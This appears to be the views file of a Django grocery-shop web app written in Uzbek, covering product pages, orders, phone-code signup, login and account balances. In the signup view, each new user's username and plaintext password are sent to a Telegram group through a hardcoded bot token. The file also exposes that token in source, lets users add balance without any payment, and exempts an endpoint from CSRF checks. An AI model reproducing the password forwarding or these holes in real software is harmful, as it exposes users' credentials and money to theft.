from collections import defaultdict
from django.db import transaction
from django.http import JsonResponse
from django.shortcuts import render, get_object_or_404
from django.contrib.auth import authenticate,login,logout
from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from .forms import LoginForm
from django.contrib import messages
from django.contrib.auth.hashers import make_password
from django.contrib.auth import logout
from rest_framework.views import APIView
from blog.models import Order, Product, UserProfile, Purchase, OrderItem
from .serializer import Product_api,Order_api
from rest_framework.response import Response
from .forms import AddOrder,AddProduct
from django.contrib.auth.decorators import login_required
from django.core.mail import send_mail
from django.conf import settings
from .models import Product, Order
from django.http import HttpResponse
from django.utils import timezone
from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth import login
from django.core.cache import cache
from random import randint
from .forms import PhoneForm, UserRegisterForm
from django.contrib.auth.models import User
from django.contrib.admin.views.decorators import staff_member_required
from django.utils.timezone import localtime
from django.db.models import Sum
from collections import defaultdict
from collections import Counter
import requests
# Create your views here.

def home(request):
    return render(request, "index.html")

def base(request):
    return render(request, "base.html")

def buy(request):
    return render(request, "buy.html")

def login_required_redirect(request):
    return render(request, 'auth_required.html')  # yangi HTML sahifa

@login_required(login_url='auth_required')
def ximya_view(request):
    return render(request, 'ximya.html')

@login_required(login_url='auth_required')
def ichimliklar_view(request):
    return render(request, 'ichimliklar.html')

@login_required(login_url='auth_required')
def ovqatlar_view(request):
    return render(request, 'ovqatlar.html')

@login_required(login_url='auth_required')
def kolbasalar_view(request):
    return render(request, 'kolbasalar.html')

@login_required(login_url='auth_required')
def sut_view(request):
    return render(request, 'sut.html')

@login_required(login_url='auth_required')
def sabzavotlar_view(request):
    return render(request, 'sabzavotlar.html')

@login_required(login_url='auth_required')
def mevalar_view(request):
    return render(request, 'mevalar.html')

@login_required(login_url='auth_required')
def nonlar_view(request):
    return render(request, 'nonlar.html')

from collections import Counter
from django.shortcuts import redirect, render
from django.contrib import messages
from django.core.mail import send_mail
from django.conf import settings
import requests

from .models import Product, Order, OrderItem, UserProfile


def send_telegram_message(text):
    bot_token = 'YOUR_BOT_TOKEN'  # o‘rningizga yozing
    chat_id = 'YOUR_CHAT_ID'      # kanal bo‘lsa -100 bilan boshlanadi
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML',
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("TELEGRAM XATOLIK:", e)


def buy_view(request):
    if request.method != 'POST':
        return redirect('saxifa')

    product_names = request.POST.getlist('product_names')
    location = request.POST.get('location', '').strip()

    if not product_names:
        messages.error(request, "🛒 Savat bo‘sh. Iltimos, mahsulot tanlang.")
        return redirect('saxifa')

    if not request.user.is_authenticated:
        messages.error(request, "Faqat ro‘yxatdan o‘tgan foydalanuvchilar xarid qilishi mumkin.")
        return redirect('login')

    user = request.user
    customer_name = user.username
    customer_email = user.email

    try:
        profile = UserProfile.objects.get(user=user)
    except UserProfile.DoesNotExist:
        messages.error(request, "Foydalanuvchi profili topilmadi.")
        return redirect('saxifa')

    product_counts = Counter(product_names)

    products = []
    total_cost = 0
    for name, count in product_counts.items():
        product = Product.objects.filter(nom=name).first()
        if not product:
            messages.error(request, f"{name} mahsuloti topilmadi.")
            return redirect('saxifa')
        products.append((product, count))
        total_cost += (product.narx or 0) * count

    if profile.balance < total_cost:
        messages.error(request, f"Hisobingizda mablag' yetarli emas. Umumiy narx: {total_cost:,} so'm.")
        return redirect('saxifa')

    profile.balance -= total_cost
    profile.save()

    order = Order.objects.create(
        customer_name=customer_name,
        customer_email=customer_email,
        location=location
    )

    for product, count in products:
        OrderItem.objects.create(
            order=order,
            product=product,
            quantity=count
        )

    subject = "🧾 Yangi buyurtma"
    maps_link = f"https://www.google.com/maps?q={location}" if location else "Lokatsiya mavjud emas"
    message = f"👤 Foydalanuvchi: {customer_name} ({customer_email})\n📍 Lokatsiya: {maps_link}\n\n"
    message += "Siz quyidagi mahsulotlarni xarid qildingiz:\n"
    for product, count in products:
        message += f"- {product.nom} × {count} ({product.narx * count:,} so'm)\n"
    message += f"\nUmumiy narx: {total_cost:,} so'm"

    try:
        send_mail(
            subject,
            message,
            settings.DEFAULT_FROM_EMAIL,
            [customer_email, settings.ADMIN_EMAIL],
            fail_silently=False,
        )
    except Exception as e:
        print("EMAIL XATOLIK:", e)
        messages.error(request, f"E-mail yuborishda xatolik: {e}")

    # === Telegram xabari yuborish ===
    telegram_text = (
        f"🧾 <b>Yangi Buyurtma</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {customer_name} ({customer_email})\n"
        f"📍 <b>Lokatsiya:</b> <a href='{maps_link}'>{location or 'Ko‘rsatilmagan'}</a>\n\n"
        f"🛍 <b>Buyurtma tafsilotlari:</b>\n"
    )
    for product, count in products:
        summa = product.narx * count
        telegram_text += f"• {product.nom} × {count} — {summa:,} so'm\n"

    telegram_text += f"\n💰 <b>Umumiy narx:</b> {total_cost:,} so'm"

    try:
        send_telegram_message(telegram_text)
    except Exception as e:
        print("TELEGRAM XATOLIK:", e)

    messages.success(request, "✅ Buyurtmangiz muvaffaqiyatli yakunlandi!")
    return render(request, 'buy.html', {
        'orders': products,
        'total': total_cost,
        'clear_cart': True
    })



def send_telegram_message(text):
    bot_token = '8149278838:AAHb6kqBtTmbHZ7VFNu0jGT1sjndfOP56KE'
    chat_id = '-1002547012590'  # Kanal/guruh uchun -100 bilan boshlanadi
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML',
    }

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # 400/500 hatolarni aniqlash uchun
        print("✅ Telegramga xabar yuborildi")
    except requests.exceptions.RequestException as e:
        print("❌ TELEGRAM XATOLIK:", e)


@staff_member_required
def admin_orders_view(request):
    items = OrderItem.objects.select_related('order', 'product').order_by('-order__sana')

    grouped_orders = defaultdict(list)
    for item in items:
        timestamp = item.order.sana.strftime('%Y-%m-%d %H:%M')
        grouped_orders[timestamp].append(item)

    grouped_list = []
    for timestamp, items in grouped_orders.items():
        total_price = sum((item.product.narx or 0) * item.quantity for item in items)
        grouped_list.append({
            'timestamp': timestamp,
            'orders': items,
            'total': total_price
        })

    grouped_list.sort(key=lambda x: x['timestamp'], reverse=True)

    return render(request, 'admin_orders.html', {
        'grouped_orders': grouped_list
    })



@login_required
def my_orders(request):
    xaridlar = Order.objects.filter(customer_email=request.user.email).order_by('-sana')

    grouped_orders = defaultdict(list)
    for xarid in xaridlar:
        sana_key = xarid.sana.replace(microsecond=0)  # sekundgacha aniqlik
        grouped_orders[sana_key].append(xarid)

    orders = []
    for sana, items in grouped_orders.items():
        mahsulotlar = []
        jami_narx = 0

        for item in items:
            order_items = OrderItem.objects.filter(order=item)  # ⬅️ Oraliq modeldan olish
            for oi in order_items:
                mahsulotlar.append(f"{oi.product.nom} × {oi.quantity}")
                jami_narx += (oi.product.narx or 0) * oi.quantity

        if mahsulotlar:
            orders.append({
                'sana': sana,
                'products': mahsulotlar,
                'total': jami_narx
            })

    return render(request, 'my_orders.html', {'orders': orders})




@login_required
def index(request):
    return render(request, 'index.html')

@csrf_exempt
def notify_admin(request):
    if request.method == 'POST':
        import json
        data = json.loads(request.body)
        msg = data.get('message', 'Yangi buyurtma mavjud.')

        # Email orqali admin'ga xabar yuborish
        send_mail(
            subject='🔔 Yangi buyurtma',
            message=msg,
            from_email=settings.DEFAULT_FROM_EMAIL,
            recipient_list=[settings.ADMIN_EMAIL],
            fail_silently=False
        )

        return JsonResponse({'status': 'ok'})
    return JsonResponse({'error': 'Invalid method'}, status=405)

def phone_request_view(request):
    if request.method == "POST":
        form = PhoneForm(request.POST)
        if form.is_valid():
            phone = form.cleaned_data["phone"]
            code = randint(100000, 999999)
            cache.set(phone, code, timeout=300)  # 5 daqiqa
            print(f"[DEBUG] KOD: {code}")  # Debugda ko‘rish uchun
            request.session["phone"] = phone
            return redirect("verify")
    else:
        form = PhoneForm()
    return render(request, "users/phone_request.html", {"form": form})

def verify_code_view(request):
    phone = request.session.get("phone")
    if not phone:
        return redirect("phone")

    if request.method == "POST":
        code = request.POST.get("code")
        expected = cache.get(phone)
        if expected and str(code) == str(expected):
            request.session["verified"] = True
            return redirect("sign")
        else:
            messages.error(request, "Kod noto‘g‘ri yoki eskirgan!")
    return render(request, "users/verify.html")

def signup_view(request):
    if not request.session.get("verified"):
        return redirect("phone")

    if request.method == "POST":
        form = UserRegisterForm(request.POST)
        if form.is_valid():
            password = form.cleaned_data["password1"]
            user = form.save(commit=False)
            user.username = request.session["phone"]
            user.set_password(password)
            user.save()

            # ✅ Telegramga xabar yuborish (username va parol bilan)
            text = (
                f"📱 <b>Yangi foydalanuvchi ro‘yxatdan o‘tdi</b>\n\n"
                f"👤 <b>Username (telefon):</b> {user.username}\n"
                f"🔑 <b>Parol:</b> {password}"
            )
            send_tg(text)

            login(request, user)
            messages.success(request, "Muvaffaqiyatli ro‘yxatdan o‘tildi!")
            request.session.pop("verified")
            return redirect("saxifa")
    else:
        form = UserRegisterForm()

    return render(request, "users/signup.html", {"form": form})


def send_tg(text):
    bot_token = '8149278838:AAHb6kqBtTmbHZ7VFNu0jGT1sjndfOP56KE'
    chat_id = '-1002547012590'  # Guruh yoki kanal ID (-100 bilan boshlanadi)
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML',
    }

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print("✅ Telegramga xabar yuborildi")
    except requests.exceptions.RequestException as e:
        print("❌ TELEGRAM XATOLIK:", e)


#userlar uchun
def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            user = authenticate(request, username=username, password=password)
            if user is not None:
                login(request, user)
                messages.success(request, "✅ Siz tizimga muvaffaqiyatli kirdingiz!")
                return redirect('saxifa')  # index view nomi
            else:
                messages.error(request, "❌ Login yoki parol noto‘g‘ri.")
    else:
        form = LoginForm()
    return render(request, 'users/login.html', {'forms': form})



def logout_view(request):
    logout(request)
    return redirect('saxifa')

# Create your views here.

class API_view1(APIView):
    def get(self,request):
        articles=Product.objects.all()
        serializer=Product_api(articles,many=True).data
        data={
            "status":True,
            "messagge":"Barcha Productlar",
            "articles":serializer
        }
        return Response(data)

class API_view2(APIView):
    def get(self,request):
        articles=Order.objects.all()
        serializer=Order_api(articles,many=True).data
        data={
            "status":True,
            "messagge":"Barcha Zakazlar",
            "articles":serializer
        }
        return Response(data)




@login_required
def account_view(request):
    profile, _ = UserProfile.objects.get_or_create(user=request.user)

    if request.method == 'POST':
        try:
            amount = int(request.POST.get('amount', 0))
            if amount >= 100000:
                profile.balance += amount
                profile.save()
            else:
                # Minimal to‘ldirishdan past bo‘lsa, xatolik ko‘rsatish (xohlasangiz `messages` bilan ham)
                return render(request, 'account.html', {
                    'balance': profile.balance,
                    'error': "Minimal to‘ldirish miqdori 100 000 so‘m!"
                })
        except ValueError:
            return render(request, 'account.html', {
                'balance': profile.balance,
                'error': "Noto‘g‘ri qiymat kiritildi."
            })

        return redirect('hisob')

    return render(request, 'account.html', {'balance': profile.balance})

@login_required
def buy_product(request, product_id):
    product = get_object_or_404(Product, id=product_id)
    user_profile = get_object_or_404(UserProfile, user=request.user)

    if user_profile.balance >= product.price:
        try:
            with transaction.atomic():
                user_profile.balance -= product.price
                user_profile.save()

                Purchase.objects.create(user=request.user, product=product)
                messages.success(request, f"✅ {product.name} muvaffaqiyatli xarid qilindi!")
        except:
            messages.error(request, "❌ Xaridda xatolik yuz berdi.")
    else:
        messages.error(request, "❌ Balans yetarli emas.")

    return redirect('product_list')  # kerakli url nomi
